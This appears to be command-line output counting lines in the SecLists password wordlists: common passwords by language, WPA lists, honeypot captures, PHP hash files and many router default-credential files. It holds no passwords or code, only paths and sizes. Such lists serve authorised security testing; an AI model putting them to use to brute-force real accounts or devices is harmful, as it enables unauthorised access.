    99999 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/German_common-password-list-top-100000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Crotian_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Italian_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Japanese_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Hungarian_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Latvian_Pwdb_common-password-list-top-150.txt
   525958 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Spanish_common-usernames-and-passwords.txt
      999 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/German_common-password-list-top-1000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Polish_Pwdb_common-password-list-top-150.txt
  4322843 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Dutch_common-pasword-list.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Russian_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Icelandic_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/German_Pwdb_common-password-list-top-150.txt
     1000 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list-top-1000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Turkish_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Indonesian_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Danish_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Spanish_Pwdb_common-password-list-top-150.txt
   999999 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/German_common-password-list-top-1000000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Portugese_Pwdb_common-password-list-top-150.txt
  1834304 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/German_common-password-list.txt
      716 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Spanish_1000-common-usernames-and-passwords.txt
   100000 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list-top-100000.txt
     9999 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/German_common-password-list-top-10000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Estonaian_Pwdb_common-password-list-top-150.txt
     5000 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/French-common-password-list-top-5000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Slovak_Pwdb_common-password-list-top-150.txt
    12645 /usr/share/seclists/Passwords/Common-Credentials/probable-v2_top-12000.txt
 10000000 /usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000000.txt
    10000 /usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000.txt
       10 /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-10.txt
     1041 /usr/share/seclists/Passwords/cirt-default-passwords.txt
      447 /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top447.txt
     4800 /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
       62 /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top62.txt
       72 /usr/share/seclists/Passwords/Permutations/password-permutations.txt
     1134 /usr/share/seclists/Passwords/Permutations/1337speak.txt
     1152 /usr/share/seclists/Passwords/Permutations/korelogic-password.txt
    51286 /usr/share/seclists/Passwords/Honeypot-Captures/python-heralding-sep2019.txt
   105096 /usr/share/seclists/Passwords/Honeypot-Captures/multiplesources-passwords-fabian-fingerle.de.txt
       23 /usr/share/seclists/Passwords/Honeypot-Captures/Sucuri-Top-Wordpress-Passwords.txt
       10 /usr/share/seclists/Passwords/Honeypot-Captures/wordpress-attacks-july2014.txt
    13431 /usr/share/seclists/Passwords/months.txt
     1000 /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt
     5390 /usr/share/seclists/Passwords/seasons.txt
       46 /usr/share/seclists/Passwords/PHP-Hashes/Plaintext/plaintext.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/tiger128,3.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/fnv164.txt
        0 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/haval160,3.txt
        1 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/photon-160-36-36.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/fnv1a64.txt
        2 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/spongent-88-80-8.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/ripemd128.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/murmur3c.txt
        2 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/spongent-88-176-88.txt
       63 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/sha1.txt
       20 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/tiger128,4.txt
       16 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/haval128,5.txt
        0 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/tiger160,3.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/murmur3f.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/crc32b.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/md4.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/xxh3.txt
       21 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/haval128,4.txt
        3 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/haval160,5.txt
        0 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/tiger192,3.txt
       25 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/sha224.txt
       12 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/sha256.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/murmur3a.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/xxh128.txt
        2 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/photon-128-16-16.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/crc32.txt
        1 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/spongent-128-128-8.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/joaat.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/fnv132.txt
        0 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/ripemd160.txt
       20 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/md2.txt
        2 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/spongent-128-256-128.txt
     1023 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/md5.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/xxh64.txt
        3 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/photon-80-20-16.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/haval128,3.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/xxh32.txt
        0 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/tiger160,4.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/fnv1a32.txt
        1 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/quark-u-quark-136.txt
        0 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/haval160,4.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Truncated/descrypt.txt
        2 /usr/share/seclists/Passwords/PHP-Hashes/Truncated/bcrypt.txt
       49 /usr/share/seclists/Passwords/PHP-Hashes/README.md
        0 /usr/share/seclists/Passwords/PHP-Hashes/Pre-Hashed/pbkdf2-sha256.txt
        3 /usr/share/seclists/Passwords/PHP-Hashes/Pre-Hashed/pbkdf2-sha1.txt
        0 /usr/share/seclists/Passwords/PHP-Hashes/Pre-Hashed/pbkdf2-sha224.txt
    12877 /usr/share/seclists/Passwords/SCRABBLE-hackerhouse.tgz
       10 /usr/share/seclists/Passwords/xato-net-10-million-passwords-10.txt
        8 /usr/share/seclists/Passwords/500-worst-passwords.txt.bz2
      100 /usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt
     1761 /usr/share/seclists/Passwords/corporate_passwords.txt
      249 /usr/share/seclists/Passwords/Default-Credentials/Oracle EBS userlist.txt
      151 /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt
       76 /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
     1315 /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt
       41 /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt
      249 /usr/share/seclists/Passwords/Default-Credentials/Oracle EBS passwordlist.txt
     2875 /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/conceptronic_default-passwords.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/sagemcom_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/adb_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/iskratel_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/atlantis-land_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/vonage_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/inventel_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/legrand_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/bandluxe_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/cbn_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/aolynk_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/engenius_default-passwords.txt
        8 /usr/share/seclists/Passwords/Default-Credentials/Routers/d-link_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/airnet_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/calix_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/cisco_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/zhone_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/3com_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/web-excel_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/paradyne_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/smc_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/icotera_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/ping-communication_default-users.txt
       12 /usr/share/seclists/Passwords/Default-Credentials/Routers/huawei_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pti_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/aztech_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/2wire_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pronets_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/jaht_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/engenius_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sonicwall_default-passwords.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/linksys_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/topcom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/starbridge_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/humax_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/bandluxe_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kaiomy_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/vodafone_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/verizon_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pikatel_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/intelbras_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/olitec_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/gigabyte_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/repotec_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hawking_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/gateway_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/smartrg_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/sitecom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/verizon_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dynalink_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/axesstel_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/tornado_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/bell_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/net-lynx_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/open-networks_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/kaon-media_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kozumi_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/legrand_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/msi_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/spectrum_default-passwords.txt
       14 /usr/share/seclists/Passwords/Default-Credentials/Routers/zte_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/tecom_default-passwords.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/actiontec_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/microcom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/medialink_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/scientific-atlanta_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/airlink-101_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/trust_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/telkom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/justec_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/soho_default-passwords.txt
        6 /usr/share/seclists/Passwords/Default-Credentials/Routers/linksys_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/ericsson_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/alcatel_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/planex_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/safecom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/digisol_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/fritz-box_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telsey_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/belgacom_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/westell_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dynex_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/planet_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/airnet_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/tenda_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/eci_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/ericsson_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/intellinet_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/inventel_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/spectrum_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kingtype_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/franklin-wireless_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/kasda_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/tornado_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/etec_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/canyon_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/marconi_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/eusso_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/benq_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/riger_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/trendnet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/geek-adsl_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/eminent_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/2wire_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/level-one_default-users.txt
       13 /usr/share/seclists/Passwords/Default-Credentials/Routers/technicolor_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/microcom_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/green-packet_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/inca_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/prolink_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/ubee_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dick-smith-elec_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/cisco-linksys_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/inteno_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dynalink_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/noganet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/intellinet_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/hama_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/jensen-scandinavia_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/kraun_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/draytek_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/a-link_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dick-smith-elec_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hitron-technologies_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telewell_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/ping-communication_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/tilgin_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/calix_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/addon_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/e-tech_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hamlet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/nucom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/crypto_default-users.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/sweex_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/ice.net_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/atlantis-land_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/kasda_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/q-tec_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/ambit_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hama_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pikatel_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/efficient-siemens_default-users.txt
       11 /usr/share/seclists/Passwords/Default-Credentials/Routers/README.md
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/eminent_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/axesstel_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/readynet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/trendchip_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/safecom_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/digitus_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/visionnet_default-users.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/xavi_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/x-micro_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/lg_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telsey_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/alvarion_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/topcom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/awb-networks_default-passwords.txt
        8 /usr/share/seclists/Passwords/Default-Credentials/Routers/zyxel_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/planet_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/utstarcom_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/telkom_default-passwords.txt
        6 /usr/share/seclists/Passwords/Default-Credentials/Routers/trendnet_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/icotera_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/level-one_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/mobily_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/teracom_default-passwords.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/comtrend_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/conexant_default-users.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/siemens_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/e-tech_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/beetel_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/planex_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/luxul_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/netis_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/sagem_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/billion_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/efficient-siemens_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/siemens_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/thomson-alcatel_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/vtech_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/arcadyan_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/zoom_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/sitecom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/beetel_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/teltonika_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/eci_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/tenda_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/3com_default-passwords.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/netcomm_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/riger_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/inca_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pluscom_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telus_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/netopia_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/cnet_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/paradigm_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telus_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hitron-technologies_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/alcatel_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/tilgin_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/bell_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dynex_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/gigabyte_default-users.txt
        4 /usr/share/seclists/Passwords/Default-Credentials/Routers/netopia_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/canyon_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/belkin_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/surecom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/hawking_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/conceptronic_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/justec_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/askey_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/a-link_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/netgate_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/olitec_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/telstra_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pace-plc_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/great-speed_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/buffalo_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/luxul_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/conexant_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/totolink_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pti_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/inexq_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/loopcomm_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/telstra_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/netcoretek_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/kaon-media_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/ovislink_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/netcoretek_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/comtrend_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/visionnet_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/netis_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/vodafone_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/teltonika_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/arris_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/web-excel_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/dasan_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/vonage_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/inteno_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pci_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/cd-r-king_default-users.txt
